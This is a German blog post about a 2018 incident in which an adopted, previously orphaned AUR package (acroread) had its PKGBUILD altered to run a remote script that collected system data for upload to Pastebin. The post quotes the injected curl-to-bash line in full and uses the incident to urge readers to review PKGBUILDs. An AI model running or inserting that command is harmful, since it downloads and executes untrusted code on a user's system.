---
title: Darum sollte man PKGBUILD-Dateien im AUR immer prüfen
date: 2018-07-08T17:00:00+0100
categories:
- Linux
- OSBN
tags:
- PKGBUILD
- Prüfen
- Sicherheit
slug: darum-sollte-man-pkgbuild-dateien-im-aur-immer-pruefen
---
Als Nutzer von Arch und insbesondere von AUR bekommt es öfters zu hören, dass man die PKGBUILD-Dateien vor dem Installieren prüfen soll. Gestern Abend hat sich gezeigt wie wichtig dies ist.

So ist im AUR beispielsweise acroread vorhanden. Das Paket war verwaist und wurde gestern von einem Nutzer Namens xeactor übernommen. Soweit kein Problem. Allerdings hat er in die PKGBUILD-Datei curl -s https://ptpb.pw/~x|bash -&amp; eingetragen. Mit den Script wird ein systemd-Dienst angelegt über den Daten des kompromittierten Systems gesammelt und und Pastebin gesendet werden. Der Nutzer hat aber glücklicherweise Fehler beim erstellen des Scripts gemacht. So ist $uploader nicht vorhanden, so dass das Hochladen fehlschlägt. Zudem hat xeactor seinen Pastebin-API-Key im Klartext eingetragen.

Da die gesammelten Daten alle relativ unkritisch sind ist es allerdings fraglich was xeactor hiermit erreichen wollte. Eventuell wollte er "nur" demonstrieren wie wichtig es ist, PKBUILD-Dateien im AUR immer zu prüfen. Denn prinzipiell hätte er deutlich mehr Schaden anrichten können.

Neben acroread waren auch noch ein paar andere verwaiste Pakete betroffen. Die Änderungen wurden inzwischen wieder rückgängig gemacht und der Nutzer gesperrt. Aufgrund solcher Vorkommnisse sollte man die Mailing-List aur-general abonieren.
